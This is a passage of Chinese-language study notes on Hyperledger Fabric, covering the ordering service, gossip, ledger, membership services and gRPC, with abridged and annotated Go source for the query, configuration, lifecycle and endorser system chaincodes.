最后进行账本的更新阶段，在这个阶段，区块被追加到本地存储的账本中，并且更新区块链的状态。将区块添加到账本时，前两步的检查结果将被持久化以掩码的形式表示区块中的交易有效。这有助于后面进行重建状态。此外，所有的状态更新都是通过将writeset中的键值对写入本地完成的。  信任与故障模型 Fabric可以适应灵活的信任和故障假设。通常情况下，所有的客户端都被认为是潜在的恶意用户或是Byzantine。节点都被归入组织(organization)并且每个组织组成一个信任域(trust domain)。每个节点信任其组织内部的其他节点，而不信任其他组织的节点。排序服务同样认为所有的节点（或客户端）都是潜在的拜占庭。\nFabric网络的完整性依赖于排序服务的一致性。排序服务的信任模型取决于其实现。\n在Fabric中，分布式应用可以定义自己的信任假设，通过背书政策来传达，并且独立于排序服务实现的共识的信任假设。\n组件 Fabric使用了gRPC架构实现客户端、节点和排序服务之间的通信。\n What is gRPC?\nA high-performance, open-source universal RPC framework\ngRPC框架具有高性能，开源，跨语言的特点，使用了RPC框架，基于HTTP/2设计。\nRPC(remote procedure call，远程过程调用)框架提供了一套机制，使得应用程序之间可以进行通信，遵从server/client模型。\nRPC将一个服务调用封装在一个本地方法中，让调用者像使用本地方法一样调用服务，对其屏蔽实现细节。具体的实现则通过调用方和服务方的协议，基于TCP连接进行数据交互达成。\n在本地调用过程中，通常需要通过接口，调用具体实现，最终获取相应的数据。\n而在RPC中，本地获取到接口，随后通过网络，调用远程的实现。在使用网络时，需要通过数据序列化来传输数据。\n在gRPC中，支持多个语言的应用程序的远程调用，数据交换格式则采用了Protocol Buffer。\n如下图所示，左侧为c++语言编写的客户端，其中包含了接口的具体实现。右侧为Ruby和Java客户端，其中对接口进行了调用。客户端获取接口后，将数据通过Protocol Buffer的序列化处理后交给服务端，服务端调用具体实现，并把数据同样以序列化的形式返回给客户端。\n \rgRPC-basic\r\n成员身份管理服务（MSP） 成员身份管理服务(MSP, membership service provider)维护了系统中所有节点（客户端、节点、排序服务）的身分，并负责发布节点的凭证，用于认证和授权。节点之间的所有交互都是通过已认证的消息（通常是数字签名）发生的。成员身份管理包括每个节点的组件，可以认证交易、验证交易的完整性、签署并确认背书、验证其他的区块链操作。MSP中还包括了用于密钥管理和节点注册的工具。\nMSP是抽象的，可以有不同的实例。Fabric中，默认的MSP实现可以处理基于数字签名的PKI认证方法，并且容纳商业认证机构(CA)。Fabric提供了独立的CA——Fabric-CA。\nFabric允许设置区块链网络的两种模式。在离线模式下，凭证由CA生成，并分发到所有节点。peer节点和排序节点只能在离线模式下注册。对于客户端的注册，Fabric-CA提供了在线模式，向客户端发送加密凭证。MSP的配置必须要确保所有的节点都能识别相同的身份和认证认定为有效（特别是所有的peer节点）。\n例如，当多个组织在同一个区块链网络中时，MSP需要能够允许身份的联合。每个组织向自己的成员发放身份，每个peer节点都能识别所有组织的成员。这可以通过多个MSP实例来实现。例如，在每个组织和一个MSP之间建立一个映射。\n排序服务 排序服务可管理多个通道，对每个通道，都提供如下三个服务：\n Atomic broadcast，用于对交易进行排序，实现广播和分发 重新配置(reconfiguration)通道，成员通过广播一个配置更新事物(configuration update transaction)修改通道。 （可选择）访问控制(access control)，在这些配置中，排序服务作为可信的实体，限制交易的广播和指定peer节点和客户端的块的接收  排序服务通过系统通道上的生成块进行引导。生成块携带了配置事务(configuration transaction)，定义了排序服务的操作。\n当前版本的实现由OSN组成，OSN实现了描述的操作并且通过系统通道通信。实际的atomic broadcast函数由基于ZooKeeper的Kafka实例提供，这个实例提供了可以扩展的发布-订阅消息，在节点崩溃后仍具有强一致性(consistency)。这个实现可以运行在与OSN分离的物理节点上。OSN作为peers和Kafka实例之间的代理。\nOSN直接将收到的新交易注入到广播中。OSN将从广播中接收到的交易转换成块。只要满足三个情况之一，块就会被断开。\n 区块包含了交易允许的最大值 区块达到最大大小 从接收到第一个交易后超过某特定时间  批处理的过程是确定的，因此在所有节点上都会产生相同的区块。考虑到从广播中接收的交易数据流，前两项情况是已经确定的。对于第三个条件，当节点读入块中的第一个交易时，会开启一个计时器。如果计时器超时后，这个区块仍然没有断开，OSN会在通道上广播一个特殊的“到时断开(time-to-cut)”交易，其中记录了需要断开的区块的序列号。另一方面，每个OSN在收到“到时断开”交易后，会根据其给定的序列号，立即切断新的区块。这个交易是原子性的分发给所有连接的OSN，所以区块中都包含相同的交易列表。OSN将最近交付的一系列区块直接持久化到文件系统中，因此可以通过分发回答peer节点来回收区块。\nPeer Gossip 将三个阶段分开的好处是在开发的时候可以独立扩展。然而，由于共识算法往往有带宽限制，排序服务的吞吐量被节点的网络容量所限制。共识无法通过增加节点而扩展，反而会让吞吐量降低。然而，由于排序和验证是分开的，在排序阶段后，重要的是如何有效地广播执行阶段的结果，以交给peer节点进行验证。此外，还有如何对新加入的peer节点和长期断开的peer节点进行状态转移。这两个问题就是gossip组件所需要解决的。Fabric gossip利用流行组播(epidemic multicast)来解决这个问题。区块是由排序服务签署的。这意味着一个peer节点在收到所有区块后，可以独立的组装为区块链并验证其完整性。\ngossip的通信基于gRPC，利用TLS（传输层安全协议）进行相互识别，使得每一方都可以将TLS凭证与远程peer节点的身份绑定。gossip组件用来维护系统中当前在线的peer节点的成员视图。所有的peer节点通过定期传播成员数据独立建立一个本地视图。此外，一个peer节点可以在网络崩溃或者中断后重新连入成员视图。\nFabric的gossip组件采用了两个阶段进行信息的传播：\n 在push阶段，每个peer节点从成员视图中选择一个随机的活跃邻居集合，并向他们发送信息 在pull阶段，每个peer节点定期探测一个随机选择的peer节点集合，并请求缺失的信息   研究表明，同时使用这两种方法可以优化可用带宽并确保所有peer节点有很高的概率接收到所有信息。\n 为了减少从排序节点向网络中发送的区块的负载，协议同时在peer中选择了一个领导者(elects a leader peer)，代表peer节点从排序服务中pull区块，并启动gossip分发。这个机制对领导者出现故障具有弹性。\n分布式账本(Ledger) 账本组件在各个peer节点中维持分布式账本并建立持久性的存储，并实现账本的模拟、验证和更新阶段。整体上由一个区块存储(block store)和一个peer节点交易管理器(peer transaction manager)组成。\n区块存储(Ledger Block Store) 账本区块存储持久化交易区块，并以一组仅追加文件的形式实现。由于区块无法被改变，并以一个特定的顺序到达，一个仅追加的结构能够带来最好的性能。此外，区块存储中维护了一些索引(indices)，用来随机访问区块或区块中的交易。\npeer交易管理器(Peer Transaction Manager) peer节点交易管理器(PTM)保持版本键值对处于最新状态。它能为每一个唯一的条目(entry)的key以(key,val, ver)存储一个元组，其中包含了最近存储的值val，和最新的版本号var。版本由区块序列号和区块内的交易序列号组成，因此版本号都是唯一且递增的。PTM使用了本地键值存储来识别版本变量，具体实现使用了LevelDB和Apache CouchDB。\n在模拟时，PTM提供了一个稳定的最新状态快照。执行阶段中提到，PTM在readset中为GetState访问的每个条目记录一个元组(key, ver)，在writeset中为交易调用PutState更新的每个条目记录一个元组(key, val)。此外，PTM支持范围查询(range queries)，并计算出查询结果的加密哈希（一组(key, ver)元组），并将查询字符串和哈希添加到readset中。\n在验证阶段，PTM依次验证一个区块中的所有交易，检查交易是否与之前的任何交易产生冲突。对于readset中的所有key，如果readset中的版本记录与最新状态的版本不同，PTM就会把这个交易标记为无效。对于范围查找，PTM会重新执行查询并与之前的readset比较哈希值，确保不发生错误的读取。\n崩溃处理 账本组件在更新时需要能处理peer节点的崩溃。\n在接收到一个新区块后，PTM已经对其进行了验证，并使用了掩码将区块中的交易标记为有效或无效。此时，账本将区块写入账本的区块存储中，刷新到磁盘，随后更新区块存储的索引。随后，PTM将所有有效交易的writeset状态变化应用到本地存储中。最后，计算并持久化一个savepoint的值，表示成功应用区块数量的最大值。从崩溃中恢复时，savepoint值用来从持久化块中恢复索引和最新状态。\n链码执行 Chaincode在一个与其余peer节点松散耦合的环境中执行。支持增添新的链码编程语言的插件。目前支持Go、Java和Node。\n每个用户级或应用链码都在Docker容器环境中的独立进程中执行，这使得链码和peer节点之间相互隔离，简化了链码的生命周期管理（启动、停止、中止）。链码和peer节点通过gRCP通信。通过松散的耦合关系，peer节点不知道链码具体使用了什么语言实现。\n不同于应用链码，系统链码直接在peer节点的进程中运行，可以实现Fabric所需要的特定功能，可以用于用户链码之间的隔离限制过多的情况。\n配置和系统链码 Fabric通过通道配置(channel configuration)和系统链码(system chaincodes)进行定制。\nFabric中每个通道都会形成一个逻辑区块链。通道的配置由元数据进行维护，并永久保留在配置区块(configuration blocks)中。每个配置区块都会包含完整的通道配置，并不会包括任何其他的东西。每个区块链都以一个配置区块开始，称之为创世块(genesis block)，用于引导通道。通道的配置包括：\n 参与节点的MSP定义； OSN的网络地址； 共识实现和配许服务的共享配置，比如大小和超时等设置； 管理对排序服务操作（广播和分发）访问的规则； 管理如何修改通道配置的各个部分的规则。  通道的配置可以使用通道配置更新事务(channel configuration update transaction)进行更新，其中需要包括对配置进行的修改和一组签名。排序节点通过使用当前的配置验证该签名是否得到授权，来评估此次更新是否有效。然后，排序节点生成一个新的配置区块，嵌入新的配置和配置更新事务。Peer节点接收后，根据当前的配置验证更新是否得到了授权，有效则进行配置更新。\n在部署应用链码时，会参考一个认可系统链码（endorsement system chaincode, ESCC）和一个验证系统链码（validation system chaincode, VSCC）。这两个链码的选择使得ESCC输出的背书，可以作为VSCC输入的一部分进行验证。ESCC将一个提案和提案模拟的结果作为输入。如果结果符合要求，则ESCC产生一个包含结果和认可的响应。对于默认的ESCC，这个背书只是peer节点的本地签名身份的签名。VSCC将一个事务作为输入，并输出该事务是否有效。对于默认的VSCC，背书被收集，并根据为链码指定的背书策略进行评估。进一步的系统链码实现其他支持功能，如链码生命周期。\n 系统链码的核心代码在/fabric/core/common/sysccprovider和/fabric/core/scc下\n 系统链码 \r系统链码结构图\r\n与普通链码对比\n    系统链码 普通链码     链码源码 无main函数 有main函数   运行空间 背书节点进程 Docker   调用方式 网络+进程内部 网络   启动参数 内置 动态输入   通信方式 Golang的通道机制 网络   数据存取 Golang的通道+本地文件 网络   升级方式 和背书节点一起升级 单独升级   背书策略 无 有    系统链码在Peer节点上的注册与部署 peer节点存在于docker容器中，在启动时通过执行peer node start命令来启动peer节点。\n /internal/peer/node/start.go\n start命令的入口函数为serve函数。\n以下源代码中仅保留部署系统链码的部分。\nfunc serve(args []string) error { // Initialize chaincode service  // deploy system chaincodes \tfor _, cc := range []scc.SelfDescribingSysCC{lsccInst, csccInst, qsccInst, lifecycleSCC} { if enabled, ok := chaincodeConfig.SCCWhitelist[cc.Name()]; !ok || !enabled { logger.Infof(\u0026#34;not deploying chaincode %s as it is not enabled\u0026#34;, cc.Name()) continue } // 判断链码的设置是否为enabled \tscc.DeploySysCC(cc, chaincodeSupport) // 部署系统链码 \t} logger.Infof(\u0026#34;Deployed system chaincodes\u0026#34;) //... } 通过遍历scc.SelfDescribingSysCC返回值，调用scc.DeploySysCC函数。\n找到scc源文件：\n corn/scc/scc.go\n type SelfDescribingSysCC interface { //Unique name of the system chaincode \tName() string // Chaincode returns the underlying chaincode \tChaincode() shim.Chaincode } SelfDescribingSysCC的第二个方法为Chaincode()返回值为shim.Chaincode类型。在core\\scc\\cscc\\configure.go中发现如下代码：\nfunc (e *PeerConfiger) Chaincode() shim.Chaincode { return e } 可知start.go中的cc为每个链码的配置\ntype PeerConfiger struct { policyChecker policy.PolicyChecker configMgr config.Manager aclProvider aclmgmt.ACLProvider deployedCCInfoProvider ledger.DeployedChaincodeInfoProvider legacyLifecycle plugindispatcher.LifecycleResources newLifecycle plugindispatcher.CollectionAndLifecycleResources peer *peer.Peer bccsp bccsp.BCCSP } 下面是DeploySysCC的代码\ntype ChaincodeStreamHandler interface { HandleChaincodeStream(ccintf.ChaincodeStream) error LaunchInProc(packageID string) \u0026lt;-chan struct{} } // 负责peer节点与链码之间的通信  func DeploySysCC(sysCC SelfDescribingSysCC, chaincodeStreamHandler ChaincodeStreamHandler) { sysccLogger.Infof(\u0026#34;deploying system chaincode \u0026#39;%s\u0026#39;\u0026#34;, sysCC.Name()) ccid := ChaincodeID(sysCC.Name()) done := chaincodeStreamHandler.LaunchInProc(ccid) peerRcvCCSend := make(chan *pb.ChaincodeMessage) ccRcvPeerSend := make(chan *pb.ChaincodeMessage) // 并行传输数据 \tgo func() { stream := newInProcStream(peerRcvCCSend, ccRcvPeerSend) defer stream.CloseSend() sysccLogger.Debugf(\u0026#34;starting chaincode-support stream for %s\u0026#34;, ccid) err := chaincodeStreamHandler.HandleChaincodeStream(stream) sysccLogger.Criticalf(\u0026#34;shim stream ended with err: %v\u0026#34;, err) }() go func(sysCC SelfDescribingSysCC) { stream := newInProcStream(ccRcvPeerSend, peerRcvCCSend) defer stream.CloseSend() sysccLogger.Debugf(\u0026#34;chaincode started for %s\u0026#34;, ccid) err := shim.StartInProc(ccid, stream, sysCC.Chaincode()) sysccLogger.Criticalf(\u0026#34;system chaincode ended with err: %v\u0026#34;, err) }(sysCC) \u0026lt;-done } 因此，在serve.go代码中，对lscc,qscc,cscc三个系统链码进行相应的初始创建，随后根据配置信息部署到peer节点中。\n查询系统链码 (Querier System Chaincode, QSCC) 源代码  /core/scc/qscc/query.go\n 在所有Peer节点上运行，提供账本查询接口，包括了区块查询、交易查询等。\npackage qscc import ( \u0026#34;fmt\u0026#34; // 格式化IO \t\u0026#34;strconv\u0026#34; // 数据类型转换  \u0026#34;github.com/hyperledger/fabric-chaincode-go/shim\u0026#34; // shim包提供API访问链码chaincode的状态变量，chaincode用来和peer沟通的接口 \tpb \u0026#34;github.com/hyperledger/fabric-protos-go/peer\u0026#34; // 调用.pb.go文件，由proto文件生成 \t\u0026#34;github.com/hyperledger/fabric/common/flogging\u0026#34; \u0026#34;github.com/hyperledger/fabric/core/aclmgmt\u0026#34; \u0026#34;github.com/hyperledger/fabric/core/ledger\u0026#34; \u0026#34;github.com/hyperledger/fabric/protoutil\u0026#34; // Proto Buffer的通用方法 ) // LedgerGetter gets the PeerLedger associated with a channel. type LedgerGetter interface { GetLedger(cid string) ledger.PeerLedger } // New returns an instance of QSCC. // Typically this is called once per peer. func New(aclProvider aclmgmt.ACLProvider, ledgers LedgerGetter) *LedgerQuerier { return \u0026amp;LedgerQuerier{ aclProvider: aclProvider, ledgers: ledgers, } } // (e *LedgerQuerier) 表示这是LedgerQuerier结构体的方法 func (e *LedgerQuerier) Name() string { return \u0026#34;qscc\u0026#34; } func (e *LedgerQuerier) Chaincode() shim.Chaincode { return e } // LedgerQuerier implements the ledger query functions, including: // - GetChainInfo returns BlockchainInfo // - GetBlockByNumber returns a block // - GetBlockByHash returns a block // - GetTransactionByID returns a transaction type LedgerQuerier struct { aclProvider aclmgmt.ACLProvider ledgers LedgerGetter } var qscclogger = flogging.MustGetLogger(\u0026#34;qscc\u0026#34;) // 将函数名定义为字符串常量，用于invoke的第一个arg参数 const ( GetChainInfo string = \u0026#34;GetChainInfo\u0026#34; GetBlockByNumber string = \u0026#34;GetBlockByNumber\u0026#34; GetBlockByHash string = \u0026#34;GetBlockByHash\u0026#34; GetTransactionByID string = \u0026#34;GetTransactionByID\u0026#34; GetBlockByTxID string = \u0026#34;GetBlockByTxID\u0026#34; ) // Init is called once per chain when the chain is created. // This allows the chaincode to initialize any variables on the ledger prior // to any transaction execution on the chain. func (e *LedgerQuerier) Init(stub shim.ChaincodeStubInterface) pb.Response { qscclogger.Info(\u0026#34;Init QSCC\u0026#34;) return shim.Success(nil) } // 调用Invoke时，args[0]为查询函数名，args[1]为chain id，在加到stub包之前为暂时的id // 每个函数都需要额外的参数，如下: // # GetChainInfo: 返回一个以字节为单位的BlockchainInfo对象 // # GetBlockByNumber: 返回args[2]中所指定的块 // # GetBlockByHash: 返回args[2]中的块哈希值所指定的块 // # GetTransactionByID: 返回args[2]中的id所指定的交易事务 func (e *LedgerQuerier) Invoke(stub shim.ChaincodeStubInterface) pb.Response { // 通过args调用内部函数 \targs := stub.GetArgs() // stub是RPC中客户端与服务器端传输的消息包，将其解包并获取args  // args数量小于2时，返回错误信息  // 第一个args为调用的函数名，第二个args为chain ID \tfname := string(args[0]) cid := string(args[1]) sp, err := stub.GetSignedProposal() // 获取签名交易提议的解码对象，类型为SignedProposal \tname, err := protoutil.InvokedChaincodeName(sp.ProposalBytes) targetLedger := e.ledgers.GetLedger(cid) qscclogger.Debugf(\u0026#34;Invoke function: %s on chain: %s\u0026#34;, fname, cid) // Handle ACL: （ACL：访问控制权限） \tres := getACLResource(fname) if err = e.aclProvider.CheckACL(res, cid, sp); err != nil { return shim.Error(fmt.Sprintf(\u0026#34;access denied for [%s][%s]: [%s]\u0026#34;, fname, cid, err)) } // 调用相应的函数并传递参数 \tswitch fname { case GetTransactionByID: return getTransactionByID(targetLedger, args[2]) case GetBlockByNumber: return getBlockByNumber(targetLedger, args[2]) case GetBlockByHash: return getBlockByHash(targetLedger, args[2]) case GetChainInfo: return getChainInfo(targetLedger) case GetBlockByTxID: return getBlockByTxID(targetLedger, args[2]) } return shim.Error(fmt.Sprintf(\u0026#34;Requested function %s not found.\u0026#34;, fname)) } // 以下为五个private方法，只能通过invoke进行调用。 // 五个方法在进行异常处理后，调用账本中对应的方法，并将成功或错误结果通过shim发送 // - getTransactionByID: 返回对应id的交易内容 func getTransactionByID(vledger ledger.PeerLedger, tid []byte) pb.Response { // 异常：交易为空 \tprocessedTran, err := vledger.GetTransactionByID(string(tid)) // 调用ledger.PeerLedger中的方法 \tbytes, err := protoutil.Marshal(processedTran) // 使用proto工具进行编排 my_TODO: read protoutil \treturn shim.Success(bytes) } //以下四个方法的整体结果与第一个相似 func getBlockByNumber(vledger ledger.PeerLedger, number []byte) pb.Response { bnum, err := strconv.ParseUint(string(number), 10, 64) // 转换成uint型 \tblock, err := vledger.GetBlockByNumber(bnum) // 调用账本中的方法 \tbytes, err := protoutil.Marshal(block) return shim.Success(bytes) } func getBlockByHash(vledger ledger.PeerLedger, hash []byte) pb.Response { block, err := vledger.GetBlockByHash(hash) bytes, err := protoutil.Marshal(block) return shim.Success(bytes) } func getChainInfo(vledger ledger.PeerLedger) pb.Response { binfo, err := vledger.GetBlockchainInfo() bytes, err := protoutil.Marshal(binfo) return shim.Success(bytes) } func getBlockByTxID(vledger ledger.PeerLedger, rawTxID []byte) pb.Response { txID := string(rawTxID) block, err := vledger.GetBlockByTxID(txID) bytes, err := protoutil.Marshal(block) return shim.Success(bytes) } func getACLResource(fname string) string { return \u0026#34;qscc/\u0026#34; + fname } Get方法 QSCC提供的方法都是get方法，用于从通道中获取各种数据。\n配置系统链码 (Configuration System Chaincode, CSCC)  /core/scc/cscc/configure.go\n CSCC管理peer节点上通道相关的信息并执行通道配置交易\ntype PeerConfiger struct { policyChecker policy.PolicyChecker configMgr config.Manager aclProvider aclmgmt.ACLProvider deployedCCInfoProvider ledger.DeployedChaincodeInfoProvider legacyLifecycle plugindispatcher.LifecycleResources newLifecycle plugindispatcher.CollectionAndLifecycleResources peer *peer.Peer bccsp bccsp.BCCSP } CSCC中提供了PeerConfiger类。这个类实现了peer节点配置信息的处理。对于所有的从排序服务中进来的配置交易，都会调用这个系统链码来处理交易。\nCSCC提供了三种方法\nconst ( JoinChain string = \u0026#34;JoinChain\u0026#34; GetConfigBlock string = \u0026#34;GetConfigBlock\u0026#34; GetChannels string = \u0026#34;GetChannels\u0026#34; ) JoinChain方法 JoinChain 方法用来使一个peer加入通道。它需要一个参数，即通道配置区块的序列化的protobuf byte。\nblock, err := protoutil.UnmarshalBlock(args[1]) cid, err := protoutil.GetChainIDFromBlock(block) // 1. 检查配置块的格式和要求 \t// 2. 检查加入的政策 \t// 初始化txsFilter \ttxsFilter := util.TxValidationFlags(block.Metadata.Metadata[common.BlockMetadataIndex_TRANSACTIONS_FILTER]) if len(txsFilter) == 0 { // add array of validation code hardcoded to valid \ttxsFilter = util.NewTxValidationFlagsSetValue(len(block.Data.Data), pb.TxValidationCode_VALID) block.Metadata.Metadata[common.BlockMetadataIndex_TRANSACTIONS_FILTER] = txsFilter } return e.joinChain(cid, block, e.deployedCCInfoProvider, e.legacyLifecycle, e.newLifecycle) GetConfigBlock方法 这个方法用于获取给定通道的当前的配置区块。需要一个参数：通道名字的bytes形式。\ncase GetConfigBlock: // 2. check policy \tif err = e.aclProvider.CheckACL(resources.Cscc_GetConfigBlock, string(args[1]), sp); err != nil { return shim.Error(fmt.Sprintf(\u0026#34;access denied for [%s][%s]: %s\u0026#34;, fname, args[1], err)) } return e.getConfigBlock(args[1]) GetChannel方法 这个方法用于获取peer节点目前所加入的通道。\ncase GetChannels: // 2. check get channels policy \tif err = e.aclProvider.CheckACL(resources.Cscc_GetChannels, \u0026#34;\u0026#34;, sp); err != nil { return shim.Error(fmt.Sprintf(\u0026#34;access denied for [%s]: %s\u0026#34;, fname, err)) } return e.getChannels() 生命周期系统链码 (Life Cycle System Chaincode, LSCC) LSCC主要管理链码的生命周期，主要包括：\n 在peer节点上安装链码 在通道上部署和升级链码 用户从运行中的链码获取信息  链码的生命周期 打包链码：\n在被安装到peer节点之前，链码需要被打包进一个.tar.gz文件，其中包含两个文件：\u0026ldquo;metadata.json\u0026quot;和另一个包含链码文件的文件\u0026quot;code.tar.gz\u0026rdquo;\n\u0026ldquo;metadata.json\u0026quot;包含了指定链码语言、代码路径、以及包标签的JSON文件。\n安装链码：\n每个要执行和背书交易的peer节点上都需要安装链码包。安装完成后，peer节点会构造链码。一般建议每个组织下的所有peer使用相同的链码包。\n批准链码定义：\n通过 链码定义 来管理链码。当通道成员批准一个链码定义，这个批准便作为一个组织在接受链码参数方面的投票。这些同意的组织定义允许通道成员在链码可以在通道上使用之前达成一致意见（同意链码运行在此通道上）。\n链码定义包含以下参数（需要在组织之间保持一致）：名称、版本、序列号、背书策略、私有数据集合配置、ECSS/VSCC插件、初始化\n提交链码定义到通道：\n足够多的成员同意一个链码定义后，某个组织能够提交定义到通道。提交交易首先发送给通道成员的peer节点，peer节点会查询链码定义的被同意状况，确认组织同意后为其背书，交易随后被提交到排序服务，排序服务会把链码定义提交给通道。\n源代码 部署时的config\nlsccInst := \u0026amp;lscc.SCC{ BuiltinSCCs: builtinSCCs, // type: FilesystemSupport  // Support提供了一些静态函数的实现 \tSupport: \u0026amp;lscc.SupportImpl{ GetMSPIDs: peerInstance.GetMSPIDs, }, // type: sysccprovider.SystemChaincodeProvider  // SCCProvider是用于访问系统其他部分的接口 \tSCCProvider: \u0026amp;lscc.PeerShim{Peer: peerInstance}, // type: aclmgmt.ACLProvider  // ACLProvider负责访问权限控制 \tACLProvider: aclProvider, GetMSPIDs: peerInstance.GetMSPIDs, // type: policy.PolicyChecker  // PolicyChecker是用于执行访问控制的接口 \tPolicyChecker: policyChecker, BCCSP: factory.GetDefault(), BuildRegistry: buildRegistry, ChaincodeBuilder: containerRouter, EbMetadataProvider: ebMetadataProvider, }  /core/scc/lscc/lscc.go\n Invoke代码的形式与QSCC部分类似，都是使用switch语句选择所调用的方法（将函数名定义为常量）\n由于代码过长，以下代码省略异常处理部分：\nfunc (lscc *SCC) Invoke(stub shim.ChaincodeStubInterface) pb.Response { args := stub.GetArgs() function := string(args[0]) // 第一个参数是函数名  switch function { case INSTALL: depSpec := args[1] err := lscc.executeInstall(stub, depSpec) // 根据第二个参数 deployment spec 安装链码 \treturn shim.Success([]byte(\u0026#34;OK\u0026#34;)) case DEPLOY, UPGRADE: // 至少有三个参数： 函数名，链码名和deployment spec  channel := string(args[1]) ac, exists := lscc.SCCProvider.GetApplicationConfig(channel) // 通过第二个参数获取配置  depSpec := args[2] cds := \u0026amp;pb.ChaincodeDeploymentSpec{} // 可选参数： \t// 第四个参数是 已编组的 SignaturePolicyEnvelope 代表了背书政策 \t// 第五个参数是 escc名 \t// 第六个参数是 vscc名 \t// 第七个参数是 一个已编组的 CollectionConfigPackage 类 \t// 第四个参数： \tvar EP []byte if len(args) \u0026gt; 3 \u0026amp;\u0026amp; len(args[3]) \u0026gt; 0 { EP = args[3] // EP为一个背书政策 \t} else { mspIDs := lscc.GetMSPIDs(channel) p := policydsl.SignedByAnyMember(mspIDs) // 根据通道的mspID获取背书政策？ \tEP, err = protoutil.Marshal(p) // 将结果进行编组 \t} // 第五个参数： \tvar escc []byte if len(args) \u0026gt; 4 \u0026amp;\u0026amp; len(args[4]) \u0026gt; 0 { escc = args[4] } else { escc = []byte(\u0026#34;escc\u0026#34;) // 默认为escc \t} // 第六个参数： \tvar vscc []byte if len(args) \u0026gt; 5 \u0026amp;\u0026amp; len(args[5]) \u0026gt; 0 { vscc = args[5] } else { vscc = []byte(\u0026#34;vscc\u0026#34;) // 默认为vscc \t} // 如果有第七个参数： \tvar collectionsConfig []byte if ac.Capabilities().PrivateChannelData() \u0026amp;\u0026amp; len(args) \u0026gt; 6 { collectionsConfig = args[6] } // 将所有的参数传入executeDeployOrUpgrade方法中执行 \tcd, err := lscc.executeDeployOrUpgrade(stub, channel, cds, EP, escc, vscc, collectionsConfig, function) return shim.Success(cdbytes) case CCEXISTS, CHAINCODEEXISTS, GETDEPSPEC, GETDEPLOYMENTSPEC, GETCCDATA, GETCHAINCODEDATA: // 变量个数必须为3 \tchannel := string(args[1]) ccname := string(args[2]) cdbytes, err := lscc.getCCInstance(stub, ccname) // 获取实例  switch function { case CCEXISTS, CHAINCODEEXISTS: cd, err := lscc.getChaincodeData(ccname, cdbytes) // 获取链码数据 \tcase GETCCDATA, GETCHAINCODEDATA: return shim.Success(cdbytes) case GETDEPSPEC, GETDEPLOYMENTSPEC: _, depspecbytes, err := lscc.getCCCode(ccname, cdbytes) return shim.Success(depspecbytes) default: panic(\u0026#34;unreachable\u0026#34;) } case GETCHAINCODES, GETCHAINCODESALIAS: // 变量个数必须为1 \treturn lscc.getChaincodes(stub) // 调用对应方法 \tcase GETINSTALLEDCHAINCODES, GETINSTALLEDCHAINCODESALIAS: // 变量个数必须为1 \treturn lscc.getInstalledChaincodes() // 调用对应方法 \tcase GETCOLLECTIONSCONFIG, GETCOLLECTIONSCONFIGALIAS: // 变量个数必须为2 \tchaincodeName := string(args[1]) return lscc.getChaincodeCollectionData(stub, chaincodeName) // 调用对应方法 \t} return shim.Error(InvalidFunctionErr(function).Error()) } Install方法：\n用于存储chaincode程序到peer的文件系统，需要一个参数，及chancode deployment spec的序列化protobuf bytes。\nDeploy方法：\n用于在给定的通道上实例化合约，可以接受五个参数，前两个参数是必须的：通道名称与chaincode deployment spec。另外三个参数为：倍数策略、背书系统合约的名字和验证系统合约的名字。\nUpgrade方法：\n用于升级合约\nGet方法：\n剩下的get方法都用于获取相应的合约数据\n背书系统链码 (Endorser System Chaincode, ESCC) 在背书节点上运行，对交易结束进行结构转换和签名背书。\n /core/endorser/endorser.go\n package endorser import ( \u0026#34;context\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;strconv\u0026#34; \u0026#34;time\u0026#34; \u0026#34;github.com/golang/protobuf/proto\u0026#34; \u0026#34;github.com/hyperledger/fabric-chaincode-go/shim\u0026#34; pb \u0026#34;github.com/hyperledger/fabric-protos-go/peer\u0026#34; \u0026#34;github.com/hyperledger/fabric-protos-go/transientstore\u0026#34; \u0026#34;github.com/hyperledger/fabric/common/flogging\u0026#34; \u0026#34;github.com/hyperledger/fabric/common/util\u0026#34; \u0026#34;github.com/hyperledger/fabric/core/chaincode/lifecycle\u0026#34; \u0026#34;github.com/hyperledger/fabric/core/common/ccprovider\u0026#34; \u0026#34;github.com/hyperledger/fabric/core/ledger\u0026#34; \u0026#34;github.com/hyperledger/fabric/internal/pkg/identity\u0026#34; \u0026#34;github.com/hyperledger/fabric/msp\u0026#34; \u0026#34;github.com/hyperledger/fabric/protoutil\u0026#34; \u0026#34;github.com/pkg/errors\u0026#34; \u0026#34;go.uber.org/zap\u0026#34; ) var endorserLogger = flogging.MustGetLogger(\u0026#34;endorser\u0026#34;) // The Jira issue that documents Endorser flow along with its relationship to // the lifecycle chaincode - https://jira.hyperledger.org/browse/FAB-181  //go:generate counterfeiter -o fake/prvt_data_distributor.go --fake-name PrivateDataDistributor . PrivateDataDistributor  type PrivateDataDistributor interface { DistributePrivateData(channel string, txID string, privateData *transientstore.TxPvtReadWriteSetWithConfigInfo, blkHt uint64) error } // Support contains functions that the endorser requires to execute its tasks type Support interface { identity.SignerSerializer // GetTxSimulator returns the transaction simulator for the specified ledger \t// a client may obtain more than one such simulator; they are made unique \t// by way of the supplied txid \tGetTxSimulator(ledgername string, txid string) (ledger.TxSimulator, error) // GetHistoryQueryExecutor gives handle to a history query executor for the \t// specified ledger \tGetHistoryQueryExecutor(ledgername string) (ledger.HistoryQueryExecutor, error) // GetTransactionByID retrieves a transaction by id \tGetTransactionByID(chid, txID string) (*pb.ProcessedTransaction, error) // IsSysCC returns true if the name matches a system chaincode\u0026#39;s \t// system chaincode names are system, chain wide \tIsSysCC(name string) bool // Execute - execute proposal, return original response of chaincode \tExecute(txParams *ccprovider.TransactionParams, name string, input *pb.ChaincodeInput) (*pb.Response, *pb.ChaincodeEvent, error) // ExecuteLegacyInit - executes a deployment proposal, return original response of chaincode \tExecuteLegacyInit(txParams *ccprovider.TransactionParams, name, version string, spec *pb.ChaincodeInput) (*pb.Response, *pb.ChaincodeEvent, error) // ChaincodeEndorsementInfo returns the information from lifecycle required to endorse the chaincode. \tChaincodeEndorsementInfo(channelID, chaincodeID string, txsim ledger.QueryExecutor) (*lifecycle.ChaincodeEndorsementInfo, error) // CheckACL checks the ACL for the resource for the channel using the \t// SignedProposal from which an id can be extracted for testing against a policy \tCheckACL(channelID string, signedProp *pb.SignedProposal) error // EndorseWithPlugin endorses the response with a plugin \tEndorseWithPlugin(pluginName, channnelID string, prpBytes []byte, signedProposal *pb.SignedProposal) (*pb.Endorsement, []byte, error) // GetLedgerHeight returns ledger height for given channelID \tGetLedgerHeight(channelID string) (uint64, error) // GetDeployedCCInfoProvider returns ledger.DeployedChaincodeInfoProvider \tGetDeployedCCInfoProvider() 